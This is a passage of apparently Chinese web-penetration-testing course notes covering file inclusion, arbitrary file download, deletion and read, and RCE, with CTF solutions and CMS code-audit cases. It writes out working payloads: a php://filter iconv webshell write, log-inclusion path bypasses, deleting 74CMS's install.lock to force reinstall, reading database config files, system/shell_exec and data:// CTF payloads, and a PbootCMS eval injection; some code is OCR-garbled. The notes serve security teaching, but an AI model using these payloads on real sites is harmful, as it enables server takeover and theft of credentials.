<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.:一种过滤器，和使用iconvO☒数处理流数据有等同作用</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[a]):?&gt;)</span></span><br><span class="line"><span class="string">echo&quot;经过一次反转：&quot;$result.&quot;\n&quot;</span></span><br><span class="line"><span class="string">echo&quot;经过第二次反转：&quot;.iconv(UCS-2LE&quot;,&quot;UCS-2BE&quot;,$result):</span></span><br><span class="line"><span class="string">？&gt;</span></span><br><span class="line"><span class="string">Payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line"><span class="string">contents=?&lt;hp pvelas(P_SO【】a,)&gt;?</span></span><br></pre></td></tr></table></figure>

<h4 id="CMS源码-XHCMS-代码审计-日志-绕过"><a href="#CMS源码-XHCMS-代码审计-日志-绕过" class="headerlink" title="#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h4><p>1、搜索特定函数寻包含点<br>2、国定目录及后缀名需绕过<br>3、由CMS无上传用日志包含<br>4、利用长度绕过后缀名固定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http://172.16.11.27/xhcms/?r=../../../nginx/logs/error.log...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p>-白盒发现：</p>
<p>1、可通过应用功能追踪代码定位审计</p>
<p>2、可通过脚本特定函数搜索定位审计</p>
<p>3、可通过伪协议玩法绕过相关修复等</p>
<h4 id="本课总结：-1"><a href="#本课总结：-1" class="headerlink" title="#本课总结："></a>#本课总结：</h4><p>1、有可控文件如能上传文件，配合上传后包含</p>
<p>2、无可控文件可以利用日志或Session&amp;伪协议</p>
<p>3、代码固定目录及文件后缀时需考虑版本绕过</p>
<p>4、伪协议玩法是建立在代码中只有变量存在时</p>
<h1 id="第43天：WEB攻防-通用漏洞-任意文件下载-删除重装-敏感读取-黑白审计"><a href="#第43天：WEB攻防-通用漏洞-任意文件下载-删除重装-敏感读取-黑白审计" class="headerlink" title="第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计"></a>第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</h1><h4 id="知识点：-23"><a href="#知识点：-23" class="headerlink" title="知识点："></a>知识点：</h4><p>1、<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C&spm=1001.2101.3001.7020">文件操作</a>类安全问题<br>2、文件下载&amp;册除&amp;读取<br>3、白盒&amp;黑盒&amp;探针分析</p>
<h4 id="详细点：-8"><a href="#详细点：-8" class="headerlink" title="#详细点："></a>#详细点：</h4><p><a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">文件读取</a>：基本和文件下载利用类似<br>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路<br>文件删除：除自身安全引发的文件除外，可配合删除重装锁定文件进行重装</p>
<h4 id="演示案例：-20"><a href="#演示案例：-20" class="headerlink" title="演示案例："></a>演示案例：</h4><p><strong>审计分析-文件下载XHCMS-功能点</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/589245286">https://zhuanlan.zhihu.com/p/589245286</a></p>
<p>思路：通过访问链接找寻文件内容逐步得知下载变量在函数传递的路径–全局搜索update inset变量找寻文件上传点–访问上传点尝试构造下载内容–访问下载链接成功</p>
<p><strong>审计分析-文件读取-Metlnfo-.函数搜索</strong></p>
<p><a href="https://blog.csdn.net/ZhaoSong_/article/details/132601103">https://blog.csdn.net/ZhaoSong_/article/details/132601103</a></p>
<p><strong>审计分析-文件删除74CMS-函数搜索</strong></p>
<p><a href="https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2">https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/755bc63622561d92fa1c9ad2a5c7795c--c69c--image-20240408163202959.png" alt="image-20240408163202959"></p>
<p>找到漏洞处，然后选择去删除重装文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/66393751a8de0328edac9bcaadad6294--9492--image-20240408163401656.png" alt="image-20240408163401656"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/52659ecc6bacdd0f317d4bee44f90b4e--5e82--image-20240408163812708.png" alt="image-20240408163812708"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里有点要注意，需要从admin目录下直接访问这里才能跳过csrf的监测</span><br></pre></td></tr></table></figure>

<p>思路：通过函数找到文件删除点，然后找到文件添加出通过删除函数传参删除install文件致使网站进行重新配置–可将网站数据库连接到本地。</p>
<p><strong>黑盒分析-下载读取-下载资源URL参数</strong></p>
<p>通过百度可知该框架下数据库连接文件的默认路径，构造连接进行下载<br><a href="http://67.202.70.133/files/readfile.php?file=%E2%80%A6/configuration.php">http://67.202.70.133/files/readfile.php?file=…/configuration.php</a></p>
<h4 id="白盒审计："><a href="#白盒审计：" class="headerlink" title="#白盒审计："></a>#白盒审计：</h4><p>1、文件下载<br>流程功能点抓包寻代码文件寻变量控制构造测试<br>Payload:softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt<br>2、文件删除：74CMS-配合删除重装<br>流程特定函数搜索寻发调用-构造Payload测试<br>Payload:&#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;…&#x2F;…&#x2F;data&#x2F;install.lock<br>3、文件读取：Metlnfo-任意读取<br>流程。特定函数援索寻融发调用-构造Payload测试<br>Payload:&#x2F;include&#x2F;thumb.php?dir&#x3D;http…\config\config_db.php</p>
<h4 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="#黑盒探针"></a>#黑盒探针</h4><p>1、URL参数名及参数值分析：<br>参数名：英文对应翻译<br>参数值：目录或文件名<br>2、功能点自行修改后分析：<br>文件下载，册除，读取等</p>
<h1 id="第44天：WEB攻防-通用漏洞-RCE-代码执行-命令执行-多层面检测利用"><a href="#第44天：WEB攻防-通用漏洞-RCE-代码执行-命令执行-多层面检测利用" class="headerlink" title="第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用"></a>第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</h1><h4 id="知识点：-24"><a href="#知识点：-24" class="headerlink" title="知识点："></a>知识点：</h4><p>1、RCE执行-代码执行&amp;命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);   <span class="comment">//代码执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ver&#x27;</span>);     <span class="comment">//命令执行    这两种要区分</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令执行指的是攻击者通过在 Web应用程序中注入恶意命令，从而执行非法操作。攻击者通常会利用可编辑的参数或表单字段，在注入时输入一些包含系统命令的字符，使得 Web 程序把这些字符作为命令执行。成功的攻击可以导致 Web 服务器受到控制，甚至可以窃取敏感信息或破坏系统。<br>代码执行指的是攻击者通过在 Web应用程序中注入恶意代码，从而让其在服务器端执行。攻击者通常会利用可编辑的参数或表单字段，在注入时输入一些包含恶意脚本的字符，使得 Web程序在解析时把这些字符直接当做代码执行。成功的攻击可以导致 Web 服务器受到控制，甚至可以窃取敏感信息或破坏系统。</p>
</blockquote>
<p>2、CTF考点-漏洞配合&amp;绕过手法<br>3、利用审计-CMS框架&amp;中间件等</p>
<h4 id="详细点：-9"><a href="#详细点：-9" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1.为什么会产生此类安全问题<br>2此类安全问题探针利用及危害<br>3.此类安全问题在CTF即CMS分析<br>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行<br>漏洞区别：脚本语言&amp;操作系统(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;&#x2F;linux&#x2F;mac)<br>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）<br>漏洞危害：直接权限丢失，可执行任意却本代码或系统命令</p>
<h4 id="演示案例：-21"><a href="#演示案例：-21" class="headerlink" title="演示案例："></a>演示案例：</h4><p>RCE-原理&amp;探针&amp;利用&amp;危害等<br>CTF-29-39-RCE代码命令执行<br>CMS-PbootCMS审计-RCE执行<br>层面-探针-语言&amp;CMS&amp;中间件等</p>
<h4 id="RCE-原理-探针-利用-危害等"><a href="#RCE-原理-探针-利用-危害等" class="headerlink" title="#RCE-原理&amp;探针&amp;利用&amp;危害等"></a>#RCE-原理&amp;探针&amp;利用&amp;危害等</h4><p>举例：</p>
<?php eval代码执行 eval(phpinfo（） //system命令执行 system(ipconfig'); ?>
<p>-RCE代码执行：引用脚本代码解析执行<br>RCE命令执行：脚本调用操作系统命令<br>漏洞函数：</p>
<blockquote>
<p>1.PHP: eval（）.assert()、preg_replace()、call_user_func（)、all_user_func_array()以及aray_map()等<br>system、shell_exec、popen、passthru、proc_open等<br>2.Python eval exec subprocess os.system commands<br>3.Java: Java中没有类似php中eval函数这种亘接可以将字符玉转化为代码执行的函数， 但是有反射机制，并且有各种基于反射机制的表达式擎，如：OGNL、SpEL、MVEL等</p>
</blockquote>
<p><strong>CTF-29-39-RCE代码命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">29关</span><br><span class="line">思路：看代码过滤了flag大小写格式，使用通配符绕过 ?c=system(‘tac fla*.php’);</span><br><span class="line"></span><br><span class="line">30关</span><br><span class="line">思路：看代码除了过滤flag还过滤了system、php的大小写，使用shell_exec绕过 /?c=echo shell_exec(‘tac fla*’);</span><br><span class="line"></span><br><span class="line">‘cp fla*.ph* 2.txt’:</span><br><span class="line">echo shell exec(‘tac fla*.ph*’);</span><br></pre></td></tr></table></figure>

<p>31-参数逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval($GET[1]):&amp;1=system(‘tac flag.php’);</span><br><span class="line">思路：再上一关的基础上增加过滤shell_exec cat sort等函数，这时候可以用参数逃逸，创建新参数然后让新参数执行命令</span><br></pre></td></tr></table></figure>

<p>32~36-配合包含&amp;伪协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="variable">$_</span> GET[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"><span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">思路：过滤了；分号致使语句不能结束执行，使用<span class="keyword">include</span> <span class="meta">?&gt;</span>结束语句然后利用文件包含中的伪协议进行读取</span><br></pre></td></tr></table></figure>

<p>37~39-包含&amp;伪协议&amp;通配符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac fla);?&gt;</span></span><br><span class="line">php:<span class="comment">//input post&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路：直接利用文件包含，同时使用通配符绕过php flag过滤</p>
<h4 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="#代码审计-PbootCMS-RCE代码执行"></a>#代码审计-PbootCMS-RCE代码执行</h4><p>流程：搜索特定函数-&gt;parserlfLabe-&gt;parserCommom-&gt;About&amp;Content-&gt;构造<br>AboutController:(pboot:if(eval($_POST[1])))&#x2F;pbootif)<br>ContentController:&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;(pboot:if(eval(S_REQUEST[1]))😕&#x2F;)))))<br>(&#x2F;pbootin&amp;1&#x3D;phpinto（）;</p>
<h4 id="层面-探针-语言-CMS框架-中间件"><a href="#层面-探针-语言-CMS框架-中间件" class="headerlink" title="#层面-探针-语言&amp;CMS框架&amp;中间件"></a>#层面-探针-语言&amp;CMS框架&amp;中间件</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/</a> Shiro weblogic<br>使用工具快速拿下权限</p>
<h1 id="第45天：WEB攻防-通用漏洞-PHP反序列化-POP链构造-魔术方法-原生类"><a href="#第45天：WEB攻防-通用漏洞-PHP反序列化-POP链构造-魔术方法-原生类" class="headerlink" title="第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"></a>第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</h1>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
